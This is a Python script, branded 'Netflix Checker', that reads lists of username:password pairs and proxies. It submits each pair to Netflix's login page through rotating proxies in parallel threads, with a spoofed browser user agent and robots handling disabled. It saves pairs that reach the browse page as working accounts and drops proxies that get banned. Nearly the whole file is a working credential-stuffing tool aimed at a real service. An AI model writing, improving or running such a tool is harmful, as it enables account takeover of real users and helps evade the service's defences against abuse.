from colorama import Fore
from enum import Enum
from io import TextIOWrapper
from datetime import datetime
from mechanize import HTTPError

import math
import os
import mechanize
import random
import threading
import multiprocessing
import sys
import schedule

## ------------------------ Data folders -------------------------------
MALFORMED_ACCOUNTS_FOLDER = "malformed_accounts"
MALFORMED_PROXIES_FOLDER  = "malformed_proxies"
WORKING_ACCOUNTS_FOLDER = "working_accounts"
NOTWORKING_ACCOUNTS_FOLDER = "notworking_accounts"
## ---------------------------------------------------------------------

## ------------------------ Conventions --------------------------------
GOAL_THREADS_NUMBER = 10
COMMON_FILE_CONVENTION = ".txt"
COMMON_ACCOUNT_NAME  = "accounts" + COMMON_FILE_CONVENTION
COMMON_PROXIES_NAME = "proxies" + COMMON_FILE_CONVENTION
## ---------------------------------------------------------------------

LAST_USED_PROXIES: list[str] = []
DIE_PROXIES: list[str] = []

class AccountState(Enum):
    LIVE = "LIVE",
    DIE = "DIE"

class FileType(Enum):
    ACCOUNTS = "ACCOUNTS",  
    PROXIES = "PROXIES"

def print_error(message: str) -> None:
    print(Fore.RED, message)

def welcome() -> None:
    message: str = '''
     _  _     _    __ _ _        ___ _        _           
    | \| |___| |_ / _| (_)_ __  / __| |_  ___| |_____ _ _ 
    | .` / -_)  _|  _| | \ \ / | (__| ' \/ -_) / / -_) '_|
    |_|\_\___|\__|_| |_|_/_\_\  \___|_||_\___|_\_\___|_|  

    By: LOMAXIMO                                             
    ''' 
    print(Fore.GREEN , message)
    print(Fore.BLUE , "   starting")
    print(Fore.BLUE, "   ========================================================")

def load_file_as_tuple(file_type: FileType, file_name: str | None) -> list[tuple]:
    global COMMON_FILE_CONVENTION
    global COMMON_ACCOUNT_NAME
    global COMMON_PROXIES_NAME
    
    match file_type:
        case FileType.ACCOUNTS:
            accounts_to_load = str(file_name).join(COMMON_FILE_CONVENTION) if file_name != None else COMMON_ACCOUNT_NAME
            accounts_stream = load_file(accounts_to_load)
            return transform(accounts_stream, FileType.ACCOUNTS)
        case FileType.PROXIES:
            proxies_to_load = str(file_name).join(COMMON_FILE_CONVENTION)  if file_name != None else COMMON_PROXIES_NAME
            proxies_stream = load_file(proxies_to_load)
            return transform(proxies_stream, FileType.PROXIES)
        case _:
            print_error("   No choosen option for file loading")
            sys.exit()

def process_malformed_data(data: list[str], file_type: FileType) -> None:
    global COMMON_FILE_CONVENTION
    data_type = "malformed_accounts" if file_type == file_type.ACCOUNTS else "malformed_proxies"
    file_name = datetime.now().strftime("%d-%m-%Y")
    with open(f'./{data_type}/' + file_name + COMMON_FILE_CONVENTION, "w+") as file_stream:
        for bite in data:
            file_stream.write(bite)
        file_stream.close()

def save_account(data: tuple, accounts_state: AccountState) -> None:
    global COMMON_FILE_CONVENTION
    data_type = "working_accounts" if accounts_state == accounts_state.LIVE else "notworking_accounts"
    file_name = datetime.now().strftime("%d-%m-%Y")
    with open(f'./{data_type}/' + file_name + COMMON_FILE_CONVENTION, "a+") as file_stream:
        file_stream.write(f'{str(data).replace("(", "").replace(")", "")} \n')
        file_stream.close()

def transform(stream: TextIOWrapper, file_type: FileType)   -> list[tuple]:
    list_data: list[tuple] = []
    malformed_data: list[str] = []
    try:
        for line in stream:
            if ":" in line:
                data_line: list[str] = line.split(":")
                list_data.append((data_line[0].strip(), data_line[1].strip()))
            else:
                malformed_data.append(line)
        thread = threading.Thread(target=process_malformed_data, args=(malformed_data, file_type))
        thread.start()
        if file_type != None: print(Fore.RED,  f'   Malformed {file_type.name}: {len(malformed_data)}')
        return list_data
    except Exception:
        print_error("    Error transforming file")
        print_error(f'    Exception: {str(Exception)}')
        sys.exit()
        
def load_file(file_name: str) -> TextIOWrapper:
    print(Fore.YELLOW, f'   Looking for : {file_name}')
    try:
        return open("./" + file_name, "r+")
    except IOError:
        print_error("Error trying to open accounts file")
        sys.exit()

def check_available_proxie_in_queue(proxy: str) -> bool:
    global LAST_USED_PROXIES
    if proxy in LAST_USED_PROXIES: return False
    return True
    
def purge_last_used_proxes() -> None:
    global LAST_USED_PROXIES
    if len(LAST_USED_PROXIES) > 0: LAST_USED_PROXIES.clear()

def build_proxy_address(proxy: tuple) -> str:
    return f'http://{proxy[0]}:{proxy[1]}'

def generate_request_proxy(proxies: list[tuple]) -> dict | None:
    global DIE_PROXIES
    available_proxies = [proxy for proxy in proxies if proxy not in DIE_PROXIES]
    choosen_proxy = random.choice(available_proxies)
    if len(proxies) == len(DIE_PROXIES): return None
    build_proxy = build_proxy_address(choosen_proxy)
    available_proxies = [proxy for proxy in available_proxies if check_available_proxie_in_queue(proxy=build_proxy)]

    choosen_proxy = random.choice(available_proxies)
    build_proxy = build_proxy_address(choosen_proxy)

    return {
        "http": build_proxy
    }

def chek_available_cores() -> int:
    total_cores: int = os.cpu_count()
    total_physical_cores: int = multiprocessing.cpu_count()
    multi_threading: bool = total_cores / 2 == total_physical_cores
    if multi_threading: print(Fore.YELLOW, "Multi threading thechnology available")
    print(Fore.GREEN, f'   Available cores: {total_cores}')
    return total_cores

def check_available_threads(available_cores: int) -> int:
    global GOAL_THREADS_NUMBER
    active_threads = threading.active_count() 
    unused_threads = math.floor(available_cores / active_threads)
    available_threads = 0 
    if unused_threads >= GOAL_THREADS_NUMBER:
        available_threads = math.floor(0.7 * unused_threads)
    else:
        available_threads = math.floor(0.5 * unused_threads)
    print(Fore.GREEN, f'   Unused threads: {unused_threads}')
    print(Fore.YELLOW, f'   Available threads {available_threads}')
    return available_threads

def check_account(account: tuple, proxy: dict) -> None:
    global LAST_USED_PROXIES
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'), ('Content-Type','application/json')]
    br.set_proxies(proxies=proxy)

    try:
        br.open('https://www.netflix.com/co-en/login')
        br.select_form(nr=0)
        br.form["userLoginId"] = account[0]
        br.form["password"] = account[1]
    
        print(Fore.WHITE, "   ========================================================")
        print(Fore.GREEN,f'   Testing account {account}')
    
        response = br.submit()
        if response.geturl() == "https://www.netflix.com/browse":
            print(Fore.YELLOW, f'   Account working: {account}')
            save_account(data=account, accounts_state=AccountState.LIVE)
        else:
            print(Fore.RED, f'   Account die: {account}')
            save_account(data=account, accounts_state=AccountState.DIE)
        #LAST_USED_PROXIES.append(proxy["http"])
    except HTTPError as e:
        global DIE_PROXIES
        if e.code == 403:
            DIE_PROXIES.append(proxy["http"])
            print(Fore.GREEN, "Netflix ban")
    except Exception:
        print_error(f'   Cheking error: {Exception}')

def check_accounts(accounts: list[tuple], proxies: list[tuple]) -> None:
    available_cores: int = chek_available_cores()
    purgued_accounts: list[tuple] = accounts.copy() 
    available_threads = check_available_threads(available_cores=available_cores)
    init_schedule(purge_last_used_proxes, 2)
    try:
        while available_threads != 0:
            active_threads: list = []
            for i in range(0, available_threads -1):
                proxy = generate_request_proxy(proxies=proxies)
                if(proxy == None):
                    raise ValueError("Non available proxies")
                #check_account(account=purgued_accounts[i], proxy=proxy)
                thread = threading.Thread(target=check_account, args=(purgued_accounts[i], proxy))
                thread.start()
                active_threads.append(thread)
            for thread in active_threads:
                thread.join()
            purgued_accounts = purgued_accounts[available_threads:]   
            available_threads = check_available_threads(available_cores=available_cores)
    except ValueError:
        print_error("   All proxies die: ")
    except Exception as e:
        print_error(f'   Error: {e}')

def init_schedule(function, time: int) -> None:
    schedule.every(time).seconds.do(function)

def setup() -> None:
    global MALFORMED_ACCOUNTS_FOLDER
    global MALFORMED_PROXIES_FOLDER
    global NOTWORKING_ACCOUNTS_FOLDER
    global WORKING_ACCOUNTS_FOLDER
    print(Fore.WHITE, "   Starting setup ===========================>")
    if not os.path.exists(f'./{MALFORMED_ACCOUNTS_FOLDER}'): os.makedirs(MALFORMED_ACCOUNTS_FOLDER)
    if not os.path.exists(f'./{MALFORMED_PROXIES_FOLDER}'): os.makedirs(MALFORMED_PROXIES_FOLDER)
    if not os.path.exists(f'./{NOTWORKING_ACCOUNTS_FOLDER}'): os.makedirs(NOTWORKING_ACCOUNTS_FOLDER)
    if not os.path.exists(f'./{WORKING_ACCOUNTS_FOLDER}'): os.makedirs(WORKING_ACCOUNTS_FOLDER)
    print(Fore.GREEN, "    Setup done ===========================> \n")

def start() -> None:
    welcome()
    setup()
    print(Fore.WHITE)
    file_accounts_name = str(input("    Do u have a custom accounts list? Enter the name or leave empty: "))
    accounts: list[tuple] = load_file_as_tuple(FileType.ACCOUNTS, file_accounts_name if len(file_accounts_name) > 0 else None)
    print(Fore.WHITE)
    file_proxies_name = str(input("    Do u have a custom proxie list? Enter the name or leave empty: "))
    proxies: list[tuple] = load_file_as_tuple(FileType.PROXIES, file_accounts_name if len(file_proxies_name) >0 else None)
    print(Fore.BLUE, "\n    ======================================================== \n")
    check_accounts(accounts=accounts, proxies=proxies)

if __name__ == "__main__": 
    start()